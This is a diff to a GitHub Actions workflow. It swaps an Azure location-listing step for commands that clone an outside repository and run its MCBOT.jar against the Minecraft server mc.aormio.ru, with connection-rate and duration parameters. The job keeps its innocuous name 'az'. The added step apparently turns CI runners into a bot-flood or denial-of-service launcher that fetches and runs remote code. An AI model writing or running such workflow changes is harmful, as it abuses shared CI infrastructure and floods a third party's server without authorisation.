@@ -1,7 +1,9 @@
 on: workflow_dispatch
 jobs:
   az:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04-arm
     steps:
       - run: |
-          az account list-locations --query "[].name" -o tsv
+          git clone https://github.com/nejason57mars/mcbot.git
+          cd mcbot
+          java -jar MCBOT.jar mc.aormio.ru:25565 <PROTOCOL> <METHOD> <SECONDS> <CPS>
